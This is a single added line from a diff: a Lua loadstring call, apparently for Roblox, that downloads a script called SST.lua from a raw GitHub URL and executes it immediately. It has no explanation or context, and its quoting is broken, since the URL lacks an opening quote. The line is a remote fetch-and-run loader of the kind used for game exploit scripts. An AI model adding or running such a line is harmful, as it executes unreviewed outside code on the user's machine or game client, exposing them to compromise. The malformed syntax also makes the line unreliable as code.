@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(https://raw.githubusercontent.com/globalbankingelites/games/06d9da078b23047632d4a360bd15081906216cc5/SST.lua'))()
